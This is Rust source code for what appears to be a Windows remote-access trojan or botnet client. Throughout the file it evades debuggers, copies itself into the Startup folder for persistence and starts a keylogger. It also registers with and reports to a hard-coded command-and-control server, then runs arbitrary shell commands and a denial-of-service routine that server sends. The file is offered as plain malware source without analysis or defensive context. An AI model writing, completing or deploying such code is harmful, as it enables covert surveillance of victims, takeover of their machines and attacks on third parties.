// #![windows_subsystem = "windows"]

extern crate reqwest;
extern crate serde_json;
extern crate windows;
extern crate winreg;

mod commands;
mod keylogger;
mod node;
mod utils;

use commands::dos;
use node::Node;
use reqwest::Client;
use serde_json::Value;
use std::process::{abort, Command};
use std::{env, fs, thread, time};
use utils::{calculate_hash, get_uuid};
use windows::{
    Win32::Foundation::*, Win32::System::Diagnostics::*, Win32::UI::WindowsAndMessaging::*,
};

const SERVER: &str = "http://172.20.0.3:8000";

#[tokio::main]
async fn main() {
    let client: Client = reqwest::Client::builder()
        .timeout(time::Duration::from_secs(5))
        .build()
        .unwrap();

    // check if debugger present
    unsafe {
        match Debug::IsDebuggerPresent().as_bool() {
            true => {
                println!("Debugger detected, exiting...");
                abort();
            }
            false => {}
        }
    }

    // check if test endpoint is returning proper response
    let brew_check = client.get(format!("{}/api/brew", SERVER)).send().await;

    if brew_check.unwrap().status() != 418 {
        println!("Server didn't return 418, exiting...");
        abort();
    }

    // copy self to startup folder
    let mut path = fs::canonicalize(
        "C:\\Users\\".to_string()
            + &env::var("USERNAME").unwrap()
            + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
    )
    .unwrap();

    let exe_path = env::current_exe().unwrap();
    let exe = &exe_path.file_name().unwrap();

    path.push(exe);

    match fs::copy(env::current_exe().unwrap(), &path) {
        Ok(_) => println!("Copied to {}", path.to_str().unwrap()),
        Err(e) => println!("Error: {}", e),
    }

    // register to server/get persistent data
    let mut node: Node = register().await;

    println!("{:?}", node);

    // start keylogger
    let data_folder: String = format!("C:\\ProgramData\\{},{}", node.uuid, node.random_input);

    thread::spawn(move || keylogger::start(data_folder));

    // main loop
    loop {
        let uuid: String = get_uuid();

        // update realtime data and send
        node.update_realtime();

        let json = serde_json::to_string(&node).unwrap();

        let update_realtime = client
            .patch(format!("{}/api/node/1/", SERVER))
            .body(json)
            .header("Content-Type", "application/json")
            .header("uuid", uuid.to_owned())
            .send()
            .await;

        if let Err(e) = update_realtime {
            if e.is_timeout() || e.is_connect() {
                println!("Server issue, retrying...");
                continue;
            } else {
                println!("Error: {}", e);
                continue;
            }
        }

        println!("Update Info: {}", update_realtime.unwrap().status());

        let receive_command = client
            .get(format!("{}/api/receive", SERVER))
            .header("uuid", uuid.to_owned())
            .send()
            .await;

        if let Err(e) = receive_command {
            if e.is_timeout() || e.is_connect() {
                println!("Server issue, retrying...");
                continue;
            } else {
                println!("Error: {}", e);
                continue;
            }
        }

        command(
            receive_command.unwrap().text().await.unwrap().to_string(),
            uuid,
        )
        .await;

        thread::sleep(time::Duration::from_secs(5));
    }
}

async fn register() -> Node {
    let client: Client = reqwest::Client::builder()
        .timeout(time::Duration::from_secs(5))
        .no_proxy()
        .build()
        .unwrap();

    // get client ip, abort if fail
    let mut ipv4: String = client
        .get("https://icanhazip.com/")
        .send()
        .await
        .unwrap()
        .text()
        .await
        .unwrap();

    ipv4 = ipv4.trim().to_string();

    let uuid: String = get_uuid();

    // check if already registered, and get data uuid, random_input if so
    let path = fs::canonicalize("C:\\ProgramData\\").unwrap();

    for entry in fs::read_dir(path).unwrap() {
        let entry = entry.unwrap();
        let path = entry.path();

        if path.is_dir() {
            let file: &str = path.file_name().unwrap().to_str().unwrap();
            if file.starts_with(&uuid) {
                println!("{}", file);

                let random_input: Vec<&str> = file.split(",").collect::<Vec<&str>>();

                let mut node: Node = Node::new(uuid, random_input[1].to_string(), ipv4);
                node.update_realtime();

                return node;
            }
        }
    }

    // get randomness
    let mut mouse_pos: Vec<i32> = Vec::new();

    for _ in 0..1024 {
        let mut point: POINT = POINT { x: 0i32, y: 0i32 };
        unsafe { GetCursorPos(&mut point as *mut POINT) };
        mouse_pos.push(point.x);
        mouse_pos.push(point.y);
    }

    let mut mouse_pos_str: String = String::new();

    // convert vec to concatenated string
    for i in mouse_pos {
        mouse_pos_str += &i.to_string();
    }

    let random_input: String = calculate_hash(&mouse_pos_str).to_string();

    // create node and register to server
    let mut node: Node = Node::new(uuid.to_owned(), random_input.to_owned(), ipv4);
    node.update_realtime();

    let json: String = serde_json::to_string(&node).unwrap();

    let register = client
        .post(format!("{}/api/node/", SERVER))
        .body(json)
        .header("Content-Type", "application/json")
        .send()
        .await;

    if let Err(e) = register {
        println!("Server issue, {}", e);
        abort();
    }

    // create presistent data
    let mut path = fs::canonicalize("C:\\ProgramData\\").unwrap();
    path.push(format!("{},{}", uuid, random_input));

    match fs::create_dir(path.to_owned()) {
        Ok(_) => println!("Created dir {}", path.to_str().unwrap()),
        Err(e) => println!("Error: {}", e),
    }

    return node;
}

async fn command(command_json: String, uuid: String) {
    let client: Client = reqwest::Client::builder()
        .timeout(time::Duration::from_secs(5))
        .build()
        .unwrap();

    let json: Vec<Value> = serde_json::from_str(&command_json.as_str()).unwrap();

    // get commands from json and add them to array of commands
    for command in json {
        println!("{:?}", command);

        let command_type = command["command_type"].as_str().unwrap().to_string();

        let args: Vec<String> = command["command"]
            .as_str()
            .unwrap()
            .split(" ")
            .map(|s| s.to_string())
            .collect();

        let program: String = args[0].to_string();

        if command_type == "shell" {
            // run command with args
            thread::spawn(
                move || match Command::new(program.as_str()).args(&args[1..]).spawn() {
                    Ok(mut child) => {
                        child.wait().unwrap();
                    }
                    Err(e) => println!("Error: {}", e),
                },
            );
        } else if command_type == "macro" {
            if program == "dos".to_string() {
                thread::spawn(move || dos(args));
            } else {
                println!("I do nothing... yet");
            }
        }

        if command["repeat_at"] == serde_json::json!(null) {
            // signal command has been run (really received)
            let signal = client
                .get(format!("{}/api/signal", SERVER))
                .header("uuid", uuid.to_owned())
                .query(&[("command-id", command["id"].as_u64().unwrap())])
                .send()
                .await;

            if let Err(e) = signal {
                println!("Error: {}", e);
                abort();
            }
        }
    }

    return;
}
